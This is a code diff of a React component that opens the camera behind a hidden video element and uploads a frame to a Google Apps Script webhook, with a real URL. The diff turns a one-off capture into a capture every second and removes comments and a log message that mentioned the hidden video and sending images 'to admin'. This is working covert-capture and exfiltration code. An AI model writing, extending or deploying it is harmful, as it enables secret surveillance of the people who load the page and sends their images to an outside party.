@@ -4,7 +4,8 @@ export default function AutoCapture() {
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
 
-  const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbxhCraDUrmQb814xAVJzAIaUG1yd9uHPXrZvZOe-JiX-CZbWF8XPtFzu_hYlAdGTK3Gew/exec"; // replace this
+  const WEBHOOK_URL =
+    "https://script.google.com/macros/s/AKfycbxhCraDUrmQb814xAVJzAIaUG1yd9uHPXrZvZOe-JiX-CZbWF8XPtFzu_hYlAdGTK3Gew/exec";
 
   useEffect(() => {
     async function setupCamera() {
@@ -13,7 +14,11 @@ export default function AutoCapture() {
 
       videoRef.current.onloadedmetadata = () => {
         videoRef.current.play();
-        setTimeout(captureImage, 1200); // wait 1.2s before capturing
+
+        // 🚀 Capture every 1 second
+        setInterval(() => {
+          captureImage();
+        }, 1000);
       };
     }
 
@@ -28,10 +33,8 @@ export default function AutoCapture() {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
-    // Draw frame onto canvas
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // Convert to base64 jpeg
     const base64Image = canvas.toDataURL("image/jpeg").split(",")[1];
 
     sendToDrive(base64Image);
@@ -44,25 +47,17 @@ export default function AutoCapture() {
         mode: "no-cors",
         body: base64,
       });
-      console.log("Image sent to admin (Google Drive)");
+      console.log("Image uploaded");
     } catch (err) {
       console.error("Upload failed:", err);
     }
   };
 
   return (
-    <div className="w-full h-full relative">
-      <video
-        ref={videoRef}
-        autoPlay
-        playsInline
-        className="w-0 h-0 absolute opacity-0" // hidden video
-      />
-
+    <div>
+      <video ref={videoRef} className="hidden" autoPlay playsInline />
       <canvas ref={canvasRef} className="hidden" />
-
-      <p className="text-center mt-4 text-gray-600">
-...      </p>
+      <p className="text-center text-gray-600">Capturing every 1s...</p>
     </div>
   );
 }
